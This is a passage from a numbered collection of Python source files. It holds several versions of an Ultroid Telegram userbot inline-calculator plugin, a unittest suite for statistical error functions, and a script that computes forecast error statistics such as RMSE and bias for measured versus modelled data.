dimer_params[\"cell\"] = (1000 * a, 1000 * a, 1000 * a)\n    dimer_params[\"pbc\"] = (False, False, False)\n    return dimer_params\n", "545": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import *\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    if e.client._bot:\n        return await e.reply(\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    if x == \"AC\":\n        udB.delete(\"calc\")\n        await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        udB.delete(\"calc\")\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get[:-1])\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/100\")\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/\")\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"*\")\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        get = udB.get(\"calc\")\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = await calcc(get, e)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                udB.delete(\"calc\")\n                await e.answer(\"Error\", cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + x)\n            await e.answer(str(get + x))\n        udB.set(\"calc\", x)\n        await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n", "546": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\n\nimport re\n\nfrom . import *\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    results = await ultroid_bot.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    if x == \"AC\":\n        udB.delete(\"calc\")\n        return await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        udB.delete(\"calc\")\n        return await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get[:-1])\n            return await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/100\")\n            return await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/\")\n            return await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"*\")\n            return await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        get = udB.get(\"calc\")\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = await calcc(get, e)\n            try:\n                num = float(out)\n                return await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                udB.delete(\"calc\")\n                return await e.answer(\"Error\", cache_time=0, alert=True)\n        return await e.answer(\"None\")\n    else:\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + x)\n            return await e.answer(str(get + x))\n        udB.set(\"calc\", x)\n        return await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n", "547": "import unittest\nfrom mock import Mock, MagicMock, patch\nfrom miscFuncs import *\nimport numpy as np\n\nmodulePath = 'miscFuncs.'\n\n\nclass TestDotProd(unittest.TestCase):\n\n    def test_dotProd_with_vectors_of_equal_length(self):\n        A = [[1, 1, 1], [1, 1, 1], [45, 45, 45], [\n            45, 45, 45], [45, 45, 45], [3, 3, 3]]\n        B = [[1, 2, 3], [4, 5, 6], [-1, 0, 0],\n             [0, -1, 0], [0, 0, -1], [0, 0, 0]]\n        expected = [6, 15, -45, -45, -45, 0]\n        for i in range(len(expected)):\n            self.assertAlmostEqual(expected[i], dotProd(A[i], B[i]))\n\n    def test_dotProd_with_different_length_vectors(self):\n        a = [1, 2, 3]\n        b = [1, 1]\n        self.assertRaises(AssertionError, dotProd, a, b)\n\n    def test_dotProd_with_multidimensional_arrays(self):\n        a = [[1, 1], [2, 2]]\n        b = [[1, 3], [5, 5]]\n        self.assertRaises(AssertionError, dotProd, a, b)\n\n\nclass TestCalcAbsoluteArea(unittest.TestCase):\n\n    def test_calcAbsoluteArea_with_two_negative_y_values(self):\n        y = [-2, -3]\n        x = [0, 1]\n        expected = 2.5\n        self.assertAlmostEqual(expected, calcAbsoluteArea(x, y))\n\n    def test_calcAbsoluteArea_with_two_positive_y_values(self):\n        y = [2, 3]\n        x = [0, 1]\n        expected = 2.5\n        self.assertAlmostEqual(expected, calcAbsoluteArea(x, y))\n\n    def test_calcAbsoluteArea_with_one_positive_and_one_negative_y_value(self):\n        y = [2, -3]\n        x = [0, 1]\n        expected = 2.5\n        self.assertAlmostEqual(expected, calcAbsoluteArea(x, y))\n\n    def test_calcAbsoluteArea_with_larger_sequence_of_y_values(self):\n        y = [2, 3, -1]\n        x = [0, 1, 2]\n        expected = 4.5\n        self.assertAlmostEqual(expected, calcAbsoluteArea(x, y))\n\n    def test_calcAbsoluteArea_with_unordered_x_values(self):\n        y = [2, 3]\n        x = [1, 0]\n        self.assertRaises(AssertionError, calcAbsoluteArea, x, y)\n\n    def test_calcAbsoluteArea_with_different_length_x_and_y(self):\n        y = [2, 3, 4]\n        x = [0, 1]\n        self.assertRaises(AssertionError, calcAbsoluteArea, x, y)\n\n    def test_calcAbsoluteArea_with_multidimensional_arrays(self):\n        y = [[1, 1], [2, 3]]\n        x = [[0, 1], [2, 3]]\n        self.assertRaises(AssertionError, calcAbsoluteArea, x, y)\n\n    def test_calcAbsoluteArea_with_negative_x_element(self):\n        y = [1, 2]\n        x = [-2, 2]\n        self.assertRaises(AssertionError, calcAbsoluteArea, x, y)\n\n\nclass TestCalcDotProdDiff(unittest.TestCase):\n\n    def test_calcDotProdDiff_with_nonzero_inputs_higher_analytical(self):\n        analytical = [3, 4]\n        analysis = [2, 3]\n        expected = -12.0 / 25.0\n        self.assertAlmostEqual(expected, calcDotProdDiff(analysis, analytical))\n\n    def test_calcDotProdDiff_with_nonzero_inputs_higher_analysis(self):\n        analytical = [2, 3]\n        analysis = [3, 4]\n        expected = 12.0 / 13.0\n        self.assertAlmostEqual(expected, calcDotProdDiff(analysis, analytical))\n\n    def test_calcDotProdDiff_with_zero_analysis_and_nonzero_analytical(self):\n        analytical = [3, 4]\n        analysis = [0, 0]\n        expected = -1\n        self.assertAlmostEqual(expected, calcDotProdDiff(analysis, analytical))\n\n    def test_calcDotProdDiff_with_zero_analytical_and_nonzero_analysis(self):\n        analytical = [0., 0.]\n        analysis = [3, 4]\n        self.assertRaises(\n            ZeroDivisionError,\n            calcDotProdDiff,\n            analysis,\n            analytical)\n\n\nclass TestCalcAreaDiff(unittest.TestCase):\n\n    def test_calcAreaDiff_with_nonzero_inputs_higher_analytical(self):\n        angles = [0, 1]\n        analysisData = [2, 3]\n        analyticalData = [3, 4]\n        expected = -1.0 / 3.5\n        self.assertAlmostEqual(\n            expected,\n            calcAreaDiff(\n                angles,\n                analysisData,\n                analyticalData))\n\n    def test_calAreaDiff_with_nonzero_inputs_higher_analysis(self):\n        angles = [0, 1]\n        analysisData = [3, 4]\n        analyticalData = [2, 3]\n        expected = 1.0 / 2.5\n        self.assertAlmostEqual(\n            expected,\n            calcAreaDiff(\n                angles,\n                analysisData,\n                analyticalData))\n\n    def test_calcAreaDiff_with_zero_analysis_and_nonzero_analytical(self):\n        angles = [0, 1]\n        analysisData = [0, 0]\n        analyticalData = [1, 2]\n        expected = -1\n        self.assertAlmostEqual(\n            expected,\n            calcAreaDiff(\n                angles,\n                analysisData,\n                analyticalData))\n\n    def test_calcAreaDiff_with_zero_analytical_and_nonzero_analysis(self):\n        angles = [0, 1]\n        analysisData = [1, 2]\n        analyticalData = [0, 0]\n        self.assertRaises(ZeroDivisionError,\n                          calcAreaDiff, angles, analysisData, analyticalData)\n\n\nclass TestContourAveraging(unittest.TestCase):\n\n    def setUp(self):\n        self.contEvenDict = {\n            'cont_1': [5, 0, -5], 'cont_2': [1, 0, -1], 'cont_3': [9, 0, -9],\n            'cont_4': [4, 0, -4], 'cont_5': [3, 0, -3], 'cont_6': [7, 0, -7]}\n        self.contOddDict = {\n            'cont_1': [5, 0, -5], 'cont_2': [1, 0, -1], 'cont_3': [9, 0, -9],\n            'cont_4': [4, 0, -4], 'cont_5': [3, 0, -3]}\n\n    def test_contourAveraging_with_even_number_contours_and_even_numCont(self):\n        numCont = 4\n        expected = [17.0 / 4., 0, -17.0 / 4.]\n        for i in range(len(expected)):\n            self.assertAlmostEqual(\n                expected[i], contourAveraging(\n                    self.contEvenDict, numCont)[i])\n\n    def test_contourAveraging_with_even_number_contours_and_odd_numCont(self):\n        numCont = 3\n        expected = [14.0 / 3., 0, -14.0 / 3.]\n        for i in range(len(expected)):\n            self.assertAlmostEqual(\n                expected[i], contourAveraging(\n                    self.contEvenDict, numCont)[i])\n\n    def test_contourAveraging_with_odd_number_contours_and_even_numCont(self):\n        numCont = 4\n        expected = [19.0 / 4., 0, -19.0 / 4.]\n        for i in range(len(expected)):\n            self.assertAlmostEqual(\n                expected[i], contourAveraging(\n                    self.contOddDict, numCont)[i])\n\n    def test_contourAveraging_with_odd_number_contours_and_odd_numCont(self):\n        numCont = 3\n        expected = [14.0 / 3., 0, -14.0 / 3.]\n        for i in range(len(expected)):\n            self.assertAlmostEqual(\n                expected[i], contourAveraging(\n                    self.contOddDict, numCont)[i])\n\n    def test_contourAveraging_with_even_number_contours_and_one_numCont(self):\n        numCont = 1\n        expected = [9., 0, -9.]\n        for i in range(len(expected)):\n            self.assertAlmostEqual(\n                expected[i], contourAveraging(\n                    self.contEvenDict, numCont)[i])\n\n    def test_contourAveraging_with_odd_number_contours_and_one_numCont(self):\n        numCont = 1\n        expected = [9.0, 0, -9.0]\n        for i in range(len(expected)):\n            self.assertAlmostEqual(\n                expected[i], contourAveraging(\n                    self.contEvenDict, numCont)[i])\n\n    def test_contourAveraging_with_even_number_contours_over_all_contours(\n            self):\n        numCont = len(self.contEvenDict.keys())\n        expected = [29. / 6., 0, -29. / 6]\n        for i in range(len(expected)):\n            self.assertAlmostEqual(\n                expected[i], contourAveraging(\n                    self.contEvenDict, numCont)[i])\n\n    def test_contourAveraging_with_odd_number_contours_over_all_contours(self):\n        numCont = len(self.contOddDict.keys())\n        expected = [22. / 5, 0, -22. / 5]\n        for i in range(len(expected)):\n            self.assertAlmostEqual(\n                expected[i], contourAveraging(\n                    self.contOddDict, numCont)[i])\n\n    def test_contourAveraging_with_larger_numCont_than_contours(self):\n        numCont = len(self.contEvenDict.keys()) + 1\n        self.assertRaises(\n            AssertionError, contourAveraging, self.contEvenDict, numCont)\n\n    def test_contourAveraging_over_zero_contours(self):\n        numCont = 0\n        self.assertRaises(\n            AssertionError, contourAveraging, self.contEvenDict, numCont)\n\n\nclass TestCalcErrors(unittest.TestCase):\n\n    def test_calcErrors_with_vectors_of_equal_lengths(self):\n        analysis = [\n            -20, -5, 0, 5, 20,\n            -20, -5, 0, 5, 20,\n            -20, -5, 0, 5, 20]\n        analytical = [\n            -10, -10, -10, -10, -10,\n            0, 0, 0, 0, 0,\n            10, 10, 10, 10, 10]\n        expected = [\n            10, -5, -10, -5, 10,\n            20, 5, 0, 5, 20,\n            10, -5, -10, -5, 10]\n        for i in range(len(expected)):\n            self.assertAlmostEqual(expected[i],\n                                   calcErrors(analytical, analysis)[i])\n\n    def test_calcErrors_with_vectors_of_different_lengths(self):\n        analysis = [1, 2, 3, 4, 5]\n        analytical = [1, 2, 3]\n        self.assertRaises(AssertionError, calcErrors, analytical, analysis)\n\n    def test_calcErrors_with_multidimensional_arrays_with_equal_size(self):\n        analysis = [[1, 2, 3], [1, 2, 3]]\n        analytical = [[2, 3, 4], [4, 5, 6]]\n        self.assertRaises(AssertionError, calcErrors, analytical, analysis)\n\n\nclass TestCalcDiffErrors(unittest.TestCase):\n    pass\n\n\nclass TestCalcRMSD(unittest.TestCase):\n\n    def test_calcRMSD_with_vectors_of_equal_length(self):\n        analytical = [-5, -1, 1, 2, 3, 4, 5, 6]\n        analysis = [-4, 2, -1, 0, 1, 2, 5, 9]\n        expected = (35.0 / 8.0)**0.5\n        self.assertAlmostEqual(expected, calcRMSD(analytical, analysis))\n\n    def test_calcRMSD_with_vectors_of_different_length(self):\n        analytical = [1, 2, 3, 4]\n        analysis = [1, 2, 3]\n        self.assertRaises(AssertionError, calcRMSD, analytical, analysis)\n\n    def test_calcRMSD_with_arrays_of_different_size(self):\n        analytical = [[1, 2], [4, 5]]\n        analysis = [[1, 2, 3], [1, 2, 3]]\n        self.assertRaises(AssertionError, calcRMSD, analytical, analysis)\n\n\nclass TestCalcNormErrors(unittest.TestCase):\n\n    def setUp(self):\n        self.domain = [0, 1, 2, 3, 4, 5]\n\n    def test_calcNormErrors_with_analysis_dotProd_larger(self):\n        analytical = [1, 2, 3, -4, -5, -6]\n        analysis = [2, 1, -7, -1, -9, 3]\n        #expected =   [1, -1, -10, 3, -4, 9]\n        expected = [\n            0.16666666, -0.166666666, -1.666666666, 0.5, -0.666666666, 1.5]\n        result = calcNormErrors(analytical, analysis, self.domain, 'dotProd')\n        self.assertEqual(1, result[1])\n        for i in range(len(expected)):\n            self.assertAlmostEqual(expected[i], result[0][i])\n\n    def test_calcNormErrors_with_analytical_dotProd_larger(self):\n        analysis = [1, 2, 3, -4, -5, -6]\n        analytical = [2, 1, -7, -1, -9, 3]\n        #expected =  [-1, 1, 10, -3,  4, -9]\n        expected = [-0.111111111, 0.111111111,\n                    1.11111111111, -0.333333333, 0.44444444, -1]\n        result = calcNormErrors(analytical, analysis, self.domain, 'dotProd')\n        self.assertEqual(-1, result[1])\n        for i in range(len(expected)):\n            self.assertAlmostEqual(expected[i], result[0][i])\n\n    def test_calcNormErrors_with_analytical_areas_larger(self):\n        analysis = [1, 2, 3, -4, -5, -6]\n        analytical = [2, 1, -7, -1, -9, 3]\n        #expected =  [-1, 1, 10, -3,  4, -9]\n        expected = [-0.111111111, 0.111111111,\n                    1.11111111111, -0.333333333, 0.44444444, -1]\n        result = calcNormErrors(analytical, analysis, self.domain, 'areas')\n        self.assertEqual(-1, result[1])\n        for i in range(len(expected)):\n            self.assertAlmostEqual(expected[i], result[0][i])\n\n    def test_calcNormErrors_with_analysis_areas_larger(self):\n        analytical = [1, 2, 3, -4, -5, -6]\n        analysis = [2, 1, -7, -1, -9, 3]\n        #expected =   [1, -1, -10, 3, -4, 9]\n        expected = [\n            0.16666666, -0.166666666, -1.666666666, 0.5, -0.666666666, 1.5]\n        result = calcNormErrors(analytical, analysis, self.domain, 'areas')\n        self.assertEqual(1, result[1])\n        for i in range(len(expected)):\n            self.assertAlmostEqual(expected[i], result[0][i])\n\n    def test_calcNormErrors_with_unrecognized_eSignFactor(self):\n        analytical = [1, 2, 3, -4, -5, -6]\n        analysis = [2, 1, -7, -1, -9, 3]\n        self.assertRaises(\n            KeyError,\n            calcNormErrors,\n            analytical,\n            analysis,\n            self.domain,\n            'unrecognized key')\n\n\nclass TestCalcAvgNormError(unittest.TestCase):\n\n    def test_calcAvgNormError(self):\n        domain = [0, 1, 2, 3, 4, 5]\n        analysis = [1, 2, 3, -4, -5, -6]\n        analytical = [2, 1, -7, -1, -9, 3]\n        #expected =  [-1, 1, 10, -3,  4, -9]\n        errors = [-0.111111111, 0.111111111,\n                  1.11111111111, -0.333333333, 0.44444444, -1]\n        expected = -3.1111111111 / float(len(domain))\n        mock = MagicMock(return_value=(np.array(errors), -1))\n        with patch(modulePath + 'calcNormErrors', mock):\n            result = calcAvgNormError(analytical, analysis, domain, 'areas')\n        self.assertAlmostEqual(expected, result)\n\n\nclass TestCalcMaxNormError(unittest.TestCase):\n\n    def test_calcMaxNormError(self):\n        domain = [0, 1, 2, 3, 4, 5]\n        analysis = [1, 2, 3, -4, -5, -6]\n        analytical = [2, 1, -7, -1, -9, 3]\n        #expected =  [-1, 1, 10, -3,  4, -9]\n        errors = [-0.111111111, 0.111111111,\n                  1.11111111111, -0.333333333, 0.44444444, -1]\n        mock = MagicMock(return_value=(errors, -1))\n        with patch(modulePath + 'calcNormErrors', mock):\n            result = calcMaxNormError(analytical, analysis, domain, 'areas')\n        self.assertAlmostEqual(errors[2], result)\n\n\nclass TestCalcStatsWrapper(unittest.TestCase):\n\n    def setUp(self):\n        self.areaDiffMock = MagicMock(return_value='areaDiffMock')\n        self.dpMock = MagicMock(return_value='dpMock')\n        self.avgNErrMock = MagicMock(return_value='avgNErrMock')\n        self.maxNErrMock = MagicMock(return_value='maxNErrMock')\n        self.diffErrMock = MagicMock(return_value='diffErrMock')\n        self.rmsdMock = MagicMock(return_value='rmsdMock')\n        self.patches = [\n            patch(modulePath + 'calcAreaDiff', self.areaDiffMock),\n            patch(modulePath + 'calcDotProdDiff', self.dpMock),\n            patch(modulePath + 'calcAvgNormError', self.avgNErrMock),\n            patch(modulePath + 'calcMaxNormError', self.maxNErrMock),\n            patch(modulePath + 'calcDiffErrors', self.diffErrMock),\n            patch(modulePath + 'calcRMSD', self.rmsdMock)]\n        for p in self.patches:\n            p.start()\n\n    def tearDown(self):\n        for p in self.patches:\n            p.stop()\n\n    def test_calcStatsWrapper_with_nonexisting_statKey(self):\n        self.assertRaises(KeyError, calcStatsWrapper, 'statkey',\n                          'angles', 'analytical', 'analysis', 'areas')\n\n    def test_calcStatsWrapper_with_areaDiff_statKey(self):\n        self.assertEqual(\n            'areaDiffMock',\n            calcStatsWrapper(\n                'areaDiff',\n                'angles',\n                'analytical',\n                'analysis',\n                'areas'))\n        self.areaDiffMock.assert_called_once_with(\n            angles='angles',\n            analysisData='analysis',\n            analyticalData='analytical')\n\n    def test_calcStatsWrapper_with_dotProd_statKey(self):\n        self.assertEqual(\n            'dpMock',\n            calcStatsWrapper(\n                'dotProd',\n                'angles',\n                'analytical',\n                'analysis',\n                'areas'))\n        self.dpMock.assert_called_once_with(analysisData='analysis',\n                                            analyticalData='analytical')\n\n    def test_calcStatsWrapper_with_avgNormError(self):\n        self.assertEqual(\n            'avgNErrMock',\n            calcStatsWrapper(\n                'avgNormError',\n                'angles',\n                'analytical',\n                'analysis',\n                'areas'))\n        self.avgNErrMock.assert_called_once_with(\n            analytical='analytical',\n            analysis='analysis',\n            domain='angles',\n            eSignFactor='areas')\n\n    def test_calcStatsWrapper_with_maxNormError_statKey(self):\n        self.assertEqual(\n            'maxNErrMock',\n            calcStatsWrapper(\n                'maxNormError',\n                'angles',\n                'analytical',\n                'analysis',\n                'areas'))\n        self.maxNErrMock.assert_called_once_with(\n            analytical='analytical',\n            analysis='analysis',\n            domain='angles',\n            eSignFactor='areas')\n\n    def test_calcStatsWrapper_with_difference_statKey(self):\n        self.assertEqual(\n            'diffErrMock',\n            calcStatsWrapper(\n                'difference',\n                'angles',\n                'analytical',\n                'analysis',\n                'areas'))\n        self.diffErrMock.assert_called_once_with(analytical='analytical',\n                                                 analysis='analysis')\n\n    def test_calcStatsWrapper_with_rmsd_statKey(self):\n        self.assertEqual(\n            'rmsdMock',\n            calcStatsWrapper(\n                'rmsd',\n                'angles',\n                'analytical',\n                'analysis',\n                'areas'))\n        self.rmsdMock.assert_called_once_with(analytical='analytical',\n                                              analysis='analysis')\n", "548": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n\n\"\"\"\nCreated on Mon May  8 10:54:18 2017\n\n@author: ricardofaria\n\nversion 1.0\n\nCalc the statistical errors betewen 2 dataframe tables measured & modelated with the same len, calculated:\n    Pearson correlation coefficients (R);\n    Root Mean Squared Error (RMSE);\n    Mean Squared Error (MSE);\n    Mean Absolute Error (MAE);\n    Mean Forecast Error (Bias);\n    Residual error measured-model.\n\n\nrmse(measured, modelated)\n\nNote:   For wind direction values must be betwen 0 and 360.\n        The used method is Cyclic kernel (DOI: 10.1175/WAF-D-14-00006.1):\n\n            min(b - a, a + 360 - b)\n\n\"\"\"\n\n\ndef rmse(modelated, measured, wind_direction):\n\n    import pandas as pd\n    import numpy as np\n    from collections import OrderedDict\n    from scipy import stats\n    import direction_average as dir_avg\n\n\n    # create table for calc\n    calc_tab = pd.DataFrame(OrderedDict({'modelated':modelated, 'measured':measured}))\n    #calc_tab = pd.DataFrame(OrderedDict({'modelated':np.array([-.5,0,.5]), 'measured':np.array([-.1,0,.1])}))\n    #calc_tab = pd.DataFrame(OrderedDict({'measured':err_tab.dd_med, 'modelated':err_tab.wrf_wind_dir}))\n    # Residual error measured-model\n    if wind_direction == True :\n        calc_tab.iloc[:,0][calc_tab.iloc[:,0] == 0] = 360\n        calc_tab.iloc[:,1][calc_tab.iloc[:,1] == 0] = 360\n\n    # N\n    N = len(calc_tab.iloc[:,0])\n\n    if wind_direction == True :\n\n        dir_err1 = calc_tab.iloc[:,0] - calc_tab.iloc[:,1]\n        dir_err2 = calc_tab.iloc[:,1] + 360 - calc_tab.iloc[:,0]\n\n        dir_err1[(dir_err1 >= 180)] = dir_err2[(dir_err1 >= 180)]\n        dir_err1[(dir_err1 <= -180)] = dir_err1[(dir_err1 <= -180)] + 360\n\n        calc_tab['mod-med'] = dir_err1\n        #calc_tab['mod-med'] = 100*calc_tab['mod-med']/calc_tab.iloc[:,1]\n\n    else :\n        calc_tab['mod-med'] = calc_tab.iloc[:,0] - calc_tab.iloc[:,1]\n        #calc_tab['mod-med'] = 100*calc_tab['mod-med']/calc_tab.iloc[:,1]\n\n    # Mean Forecast Error (Bias)\n    if wind_direction == True :\n        bias = dir_avg.dir_avg(np.array(calc_tab['mod-med']))\n    else :\n        bias = np.mean(calc_tab['mod-med'])\n    #mean_forecast_error = 100*sum(calc_tab['mod-med'])/sum(calc_tab.iloc[:,1])\n    #mean_forecast_error_perc = np.mean(calc_tab['mod-med_perc'])\n\n    # Mean Absolute Error (MAE)\n    if wind_direction == True :\n        mae = dir_avg.dir_avg(np.array(np.abs(calc_tab['mod-med'])))  #mean_absolute_error = np.absolute(mean_forecast_error) #np.mean(np.absolute(calc_tab['mod-med']))\n    else :\n        mae = np.mean(np.abs(calc_tab['mod-med']))\n    #mean_absolute_error_perc = np.absolute(mean_forecast_error_perc) #np.mean(np.absolute(calc_tab['mod-med_perc']))\n\n    # Mean Squared Error (MSE)\n    if wind_direction == True :\n        mse = dir_avg.dir_avg(np.array((calc_tab['mod-med'])**2)) #/len(calc_tab['mod-med']) #np.mean((calc_tab['mod-med'])**2)\n    else :\n        mse = np.mean((calc_tab['mod-med'])**2)\n    #mean_squared_error_perc = mean_forecast_error_perc**2 #np.mean((calc_tab['mod-med_perc'])**2)\n\n    # Root Mean Squared Error (RMSE)\n    if wind_direction == True :\n        rmse =  np.sqrt(dir_avg.dir_avg(np.array((calc_tab['mod-med'])**2))) #mean_squared_error**(1/2) #np.sqrt(mean_squared_error)\n    else :\n        rmse =  np.sqrt(np.mean((calc_tab['mod-med'])**2))\n    #rmse_perc = mean_squared_error_perc**(1/2) #np.sqrt(mean_squared_error)\n\n    # Pearson product-moment correlation coefficients\n#    r = np.corrcoef(calc_tab.iloc[:,0],calc_tab.iloc[:,1])\n#    r = r[0,1]\n    r = stats.pearsonr(calc_tab.iloc[:,0],calc_tab.iloc[:,1])\n    r = r[0]\n\n    stat_table = pd.DataFrame(OrderedDict({'N':N, 'Bias':bias, 'MAE':mae, 'MSE':mse, 'RMSE':rmse, 'R':r}), index=[0]) #[mean_forecast_error, mean_absolute_error, mean_absolute_error, rmse] #pd.DataFrame({'Bias':mean_forecast_error, 'MAE':mean_absolute_error, 'MSE':mean_squared_error, 'RMSE':rmse}, index=[0])\n\n    return stat_table\n", "549": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import *\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    if e.client._bot:\n        return await e.reply(\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    if x == \"AC\":\n        udB.delete(\"calc\")\n        await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == 